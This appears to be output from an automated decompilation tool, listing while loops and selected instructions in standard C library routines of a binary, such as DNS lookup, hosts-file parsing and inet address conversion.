		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
=============================WHILE LOOPS ID : 222 @ __GI_strpbrk ====================================
++++++++ WHILE START : 74198 
++++++++ WHILE FUNCTION : __GI_strpbrk 
++++++++ WHILE END : 74228 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
=============================WHILE LOOPS ID : 223 @ inet_aton ====================================
++++++++ WHILE START : 74462 
++++++++ WHILE FUNCTION : inet_aton 
++++++++ WHILE END : 74535 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
=============================WHILE LOOPS ID : 224 @ __dns_lookup ====================================
++++++++ WHILE START : 74796 
++++++++ WHILE FUNCTION : __dns_lookup 
++++++++ WHILE END : 75424 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		__libc_close(v233);
		if (inet_pton(10, (char *)v244, (int32_t)&v245) < 1) {
		inet_addr(v244);
		int32_t v248 = socket((int32_t)v247, 2, 17); // 0x100111b4
		if (__libc_connect(v230, 28, 28) > -1) {
		__libc_send(v217, v214, result + v251, 0);
		int32_t v252 = __libc_recv(v217, v214, 512, 0); // 0x10011234
		__libc_close(v219);
		free();
		free();
		while (true) {
		__libc_close(v217);
		free();
		free();
		free();
		free();
		free();
		free();
		__libc_close(v217);
		free();
		free();
		free();
		__libc_close(v217);
		free();
		free();
		free();
		__libc_close(v217);
		free();
		free();
		free();
		__libc_close(v217);
		free();
		free();
		free();
		__libc_close(v217);
		free();
		free();
		free();
		free();
		__libc_close(v219);
		free();
		free();
		__libc_close(v219);
		free();
		free();
		__libc_close(v219);
		free();
		free();
=============================WHILE LOOPS ID : 225 @ __open_nameservers ====================================
++++++++ WHILE START : 75779 
++++++++ WHILE FUNCTION : __open_nameservers 
++++++++ WHILE END : 75977 
++++++++ INTRESTING INSTRUCTIONS :  
		if (fgets(v224, 128, v220) == 0) {
		__GI_fclose((int16_t *)v219);
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		free();
		free();
		while (true) {
=============================WHILE LOOPS ID : 227 @ __GI_strncat ====================================
++++++++ WHILE START : 80328 
++++++++ WHILE FUNCTION : __GI_strncat 
++++++++ WHILE END : 80377 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
=============================WHILE LOOPS ID : 233 @ inet_pton ====================================
++++++++ WHILE START : 81563 
++++++++ WHILE FUNCTION : inet_pton 
++++++++ WHILE END : 81808 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		if (inet_pton4(v227, v225) > 0) {
		while (true) {
		while (true) {
		while (true) {
=============================WHILE LOOPS ID : 236 @ __GI_inet_ntop ====================================
++++++++ WHILE START : 82448 
++++++++ WHILE FUNCTION : __GI_inet_ntop 
++++++++ WHILE END : 82595 
++++++++ INTRESTING INSTRUCTIONS :  
		if (inet_ntop4(a2 + 12, v260, v261 - v260 + 86) == 0) {
		v258 = sprintf(v260, (int32_t)"%x", v257, v221, v253, v254, v221, (int32_t)&v259);
		if (inet_ntop4(a2 + 12, v260, v261 - v260 + 86) == 0) {
		v258 = sprintf(v255, (int32_t)"%x", v257, v221, v253, v254, v221, (int32_t)&v259);
=============================WHILE LOOPS ID : 239 @ __read_etc_hosts_r ====================================
++++++++ WHILE START : 84404 
++++++++ WHILE FUNCTION : __read_etc_hosts_r 
++++++++ WHILE END : 84417 
++++++++ INTRESTING INSTRUCTIONS :  
		if (fgets(v222, v224, a1) != 0) {
		__GI_fclose((int16_t *)a1);
=============================WHILE LOOPS ID : 240 @ __read_etc_hosts_r ====================================
++++++++ WHILE START : 84459 
++++++++ WHILE FUNCTION : __read_etc_hosts_r 
++++++++ WHILE END : 84472 
++++++++ INTRESTING INSTRUCTIONS :  
		if (fgets(v222, v224, a1) != 0) {
		__GI_fclose((int16_t *)a1);
=============================WHILE LOOPS ID : 241 @ __read_etc_hosts_r ====================================
++++++++ WHILE START : 84508 
++++++++ WHILE FUNCTION : __read_etc_hosts_r 
++++++++ WHILE END : 84740 
++++++++ INTRESTING INSTRUCTIONS :  
		if (fgets(v222, v224, a1) != 0) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		if (__GI_strcasecmp(a2, v258) == 0) {
		if (inet_pton(2, (char *)v260, v223) > 0) {
		__GI_fclose((int16_t *)a1);
		if (inet_pton(10, (char *)v261, v221) > 0) {
		__GI_fclose((int16_t *)a1);
		__GI_fclose((int16_t *)a1);
		__GI_fclose((int16_t *)a1);
=============================WHILE LOOPS ID : 242 @ __read_etc_hosts_r ====================================
++++++++ WHILE START : 84791 
++++++++ WHILE FUNCTION : __read_etc_hosts_r 
++++++++ WHILE END : 84804 
++++++++ INTRESTING INSTRUCTIONS :  
		if (fgets(v222, v224, a1) != 0) {
		__GI_fclose((int16_t *)a1);
